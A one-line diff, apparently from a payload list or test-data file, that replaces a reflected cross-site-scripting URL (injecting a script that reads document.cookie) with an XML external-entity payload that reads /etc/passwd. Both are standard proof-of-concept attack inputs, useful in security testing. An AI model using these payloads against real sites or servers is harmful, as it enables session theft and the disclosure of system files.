@@ -1,1 +1,1 @@
-http://www.test.com/page.html?default=<script>alert(document.cookie);</script>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
